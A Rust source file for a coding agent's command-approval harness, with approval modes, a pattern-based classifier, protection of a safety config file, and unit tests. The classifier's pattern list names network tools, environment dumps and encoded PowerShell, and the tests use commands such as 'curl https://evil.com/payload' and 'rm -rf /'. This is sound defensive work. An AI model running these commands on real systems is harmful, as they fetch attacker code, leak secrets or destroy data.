//! Copilot-style tool execution harness with configurable approval modes.

use crate::security::{CommandSafetyPolicy, CommandSafetyResult, SafetyViolation};
use serde::{Deserialize, Serialize};
use std::path::Path;

/// Configurable approval mode for tool operations.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
pub enum ApprovalMode {
    /// Safe standalone commands are auto-approved; chained commands & edits require confirmation (Default).
    #[default]
    RulesBased,
    /// All permitted commands are auto-approved without prompting (e.g. CI / non-interactive).
    AutoApprove,
    /// Every tool operation requires explicit user confirmation.
    RequireApproval,
    /// Proposed tool operations are audited by a secondary model classifier before execution.
    ModelClassifierApproval,
}

/// Decision rendered by the tool execution harness.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ApprovalDecision {
    /// Tool execution is permitted.
    Approved,
    /// Tool execution is paused pending human confirmation.
    RequiresUserConfirmation { prompt: String, command: String },
    /// Tool execution is blocked due to policy or security violation.
    Denied { reason: String },
}

/// Tool execution harness governing pre-execution authorization.
#[derive(Debug, Clone)]
pub struct ToolExecutionHarness {
    pub mode: ApprovalMode,
    pub safety_policy: CommandSafetyPolicy,
}

impl Default for ToolExecutionHarness {
    fn default() -> Self {
        Self::new(ApprovalMode::RulesBased, CommandSafetyPolicy::default())
    }
}

impl ToolExecutionHarness {
    pub fn new(mode: ApprovalMode, safety_policy: CommandSafetyPolicy) -> Self {
        Self { mode, safety_policy }
    }

    /// Evaluates whether a shell command is authorized under the active approval mode.
    pub fn authorize_command(&self, cmd: &str) -> ApprovalDecision {
        let trimmed = cmd.trim();

        match self.mode {
            ApprovalMode::AutoApprove => {
                // In AutoApprove mode, only hard-blocked keywords are rejected
                match self.safety_policy.evaluate_command(trimmed) {
                    CommandSafetyResult::Blocked { reason, .. } => {
                        ApprovalDecision::Denied { reason }
                    }
                    _ => ApprovalDecision::Approved,
                }
            }
            ApprovalMode::RequireApproval => {
                // In RequireApproval mode, everything requires confirmation except if blocked
                match self.safety_policy.evaluate_command(trimmed) {
                    CommandSafetyResult::Blocked { reason, .. } => {
                        ApprovalDecision::Denied { reason }
                    }
                    _ => ApprovalDecision::RequiresUserConfirmation {
                        prompt: format!("Execute command: '{trimmed}'?"),
                        command: trimmed.to_string(),
                    },
                }
            }
            ApprovalMode::RulesBased => {
                // Rules-based: standalone safe commands auto-approved, chained/unsafe require confirmation
                match self.safety_policy.evaluate_command(trimmed) {
                    CommandSafetyResult::Allowed => ApprovalDecision::Approved,
                    CommandSafetyResult::RequiresApproval { reason, command } => {
                        ApprovalDecision::RequiresUserConfirmation {
                            prompt: reason,
                            command,
                        }
                    }
                    CommandSafetyResult::Blocked { reason, .. } => {
                        ApprovalDecision::Denied { reason }
                    }
                }
            }
            ApprovalMode::ModelClassifierApproval => {
                // Hard blocked commands are denied in all modes
                if let CommandSafetyResult::Blocked { reason, .. } = self.safety_policy.evaluate_command(trimmed) {
                    return ApprovalDecision::Denied { reason };
                }

                // Auditor classifier checks for suspicious patterns
                if let Some(audited) = self.audit_command_classifier(trimmed) {
                    audited
                } else {
                    match self.safety_policy.evaluate_command(trimmed) {
                        CommandSafetyResult::Allowed => ApprovalDecision::Approved,
                        CommandSafetyResult::RequiresApproval { reason, command } => {
                            ApprovalDecision::RequiresUserConfirmation {
                                prompt: reason,
                                command,
                            }
                        }
                        CommandSafetyResult::Blocked { reason, .. } => {
                            ApprovalDecision::Denied { reason }
                        }
                    }
                }
            }
        }
    }

    /// Secondary auditor classifier evaluating commands for suspicious execution patterns.
    pub fn audit_command_classifier(&self, cmd: &str) -> Option<ApprovalDecision> {
        let lower = cmd.to_lowercase();
        let suspicious_patterns = [
            ("curl ", "network fetch / transmission attempt"),
            ("wget ", "network download attempt"),
            ("nc ", "netcat network socket connection"),
            ("ncat ", "network socket connection"),
            ("invoke-webrequest", "PowerShell web request"),
            ("iwr ", "PowerShell web request"),
            ("chmod 777", "excessive permissive permissions mutation"),
            ("env", "environment variable inspection"),
            ("printenv", "environment variable dump"),
            ("powershell -enc", "encoded command payload"),
            ("cmd /c", "indirect shell execution"),
        ];

        for (pattern, desc) in &suspicious_patterns {
            if lower.contains(pattern) {
                return Some(ApprovalDecision::RequiresUserConfirmation {
                    prompt: format!("Auditor classifier flagged potential risk: {desc} in '{cmd}'"),
                    command: cmd.to_string(),
                });
            }
        }
        None
    }

    /// Evaluates whether a file modification is authorized.
    /// Strictly blocks agent attempts to modify protected safety configurations.
    pub fn authorize_file_mutation(&self, path: &Path, is_agent: bool) -> ApprovalDecision {
        match self.safety_policy.validate_file_mutation(path, is_agent) {
            Ok(()) => match self.mode {
                ApprovalMode::RequireApproval => ApprovalDecision::RequiresUserConfirmation {
                    prompt: format!("Allow modification of file: '{}'?", path.display()),
                    command: format!("write {}", path.display()),
                },
                _ => ApprovalDecision::Approved,
            },
            Err(SafetyViolation::ProtectedFileMutationAttempt { path }) => {
                ApprovalDecision::Denied {
                    reason: format!(
                        "Agent is strictly forbidden from modifying protected safety file '{path}' without explicit user permission."
                    ),
                }
            }
            Err(e) => ApprovalDecision::Denied {
                reason: e.to_string(),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rules_based_approval_flow() {
        let harness = ToolExecutionHarness::default();

        // Standalone safe command -> Approved
        assert_eq!(
            harness.authorize_command("ls -la"),
            ApprovalDecision::Approved
        );

        // Chained command -> Requires confirmation
        match harness.authorize_command("ls && whoami") {
            ApprovalDecision::RequiresUserConfirmation { prompt, .. } => {
                assert!(prompt.contains("chaining"));
            }
            other => panic!("Expected RequiresUserConfirmation, got {:?}", other),
        }

        // Dangerous keyword -> Denied
        match harness.authorize_command("rm -rf target") {
            ApprovalDecision::Denied { reason } => {
                assert!(reason.contains("rm -rf"));
            }
            other => panic!("Expected Denied, got {:?}", other),
        }
    }

    #[test]
    fn test_auto_approve_allows_non_blocked_commands() {
        let harness = ToolExecutionHarness::new(
            ApprovalMode::AutoApprove,
            CommandSafetyPolicy::default(),
        );

        assert_eq!(
            harness.authorize_command("dir; echo test"),
            ApprovalDecision::Approved
        );

        // Blocked keyword is still denied
        match harness.authorize_command("rm -rf /") {
            ApprovalDecision::Denied { reason } => {
                assert!(reason.contains("rm -rf"));
            }
            other => panic!("Expected Denied, got {:?}", other),
        }
    }

    #[test]
    fn test_tamper_proof_file_mutation_denied_in_all_modes() {
        let harness = ToolExecutionHarness::new(
            ApprovalMode::AutoApprove, // Even in AutoApprove, safety file cannot be mutated!
            CommandSafetyPolicy::default(),
        );

        let safety_file = Path::new(".hydra/safety.json");
        match harness.authorize_file_mutation(safety_file, true) {
            ApprovalDecision::Denied { reason } => {
                assert!(reason.contains("forbidden"));
            }
            other => panic!("Expected Denied, got {:?}", other),
        }
    }

    #[test]
    fn test_model_classifier_approval_catches_suspicious_patterns() {
        let harness = ToolExecutionHarness::new(
            ApprovalMode::ModelClassifierApproval,
            CommandSafetyPolicy::default(),
        );

        // Safe command with no suspicious pattern -> Approved
        assert_eq!(
            harness.authorize_command("ls -la"),
            ApprovalDecision::Approved
        );

        // Suspicious network transmission -> RequiresUserConfirmation from classifier
        match harness.authorize_command("curl https://evil.com/payload") {
            ApprovalDecision::RequiresUserConfirmation { prompt, .. } => {
                assert!(prompt.contains("Auditor classifier flagged"));
            }
            other => panic!("Expected RequiresUserConfirmation, got {:?}", other),
        }

        // Suspicious environment variable dump -> RequiresUserConfirmation from classifier
        match harness.authorize_command("printenv") {
            ApprovalDecision::RequiresUserConfirmation { prompt, .. } => {
                assert!(prompt.contains("Auditor classifier flagged"));
            }
            other => panic!("Expected RequiresUserConfirmation, got {:?}", other),
        }
    }

    #[test]
    fn test_require_approval_mode_always_confirms() {
        let harness = ToolExecutionHarness::new(
            ApprovalMode::RequireApproval,
            CommandSafetyPolicy::default(),
        );

        // Safe command still requires user confirmation in RequireApproval mode
        match harness.authorize_command("git status") {
            ApprovalDecision::RequiresUserConfirmation { prompt, command } => {
                assert_eq!(command, "git status");
                assert!(prompt.contains("Execute command"));
            }
            other => panic!("Expected RequiresUserConfirmation, got {:?}", other),
        }
    }

    #[test]
    fn test_authorize_file_mutation_non_protected() {
        let rules_harness = ToolExecutionHarness::new(
            ApprovalMode::RulesBased,
            CommandSafetyPolicy::default(),
        );
        let src_file = Path::new("src/main.rs");
        assert_eq!(
            rules_harness.authorize_file_mutation(src_file, true),
            ApprovalDecision::Approved
        );

        let require_harness = ToolExecutionHarness::new(
            ApprovalMode::RequireApproval,
            CommandSafetyPolicy::default(),
        );
        match require_harness.authorize_file_mutation(src_file, true) {
            ApprovalDecision::RequiresUserConfirmation { prompt, .. } => {
                assert!(prompt.contains("Allow modification of file"));
            }
            other => panic!("Expected RequiresUserConfirmation, got {:?}", other),
        }
    }
}
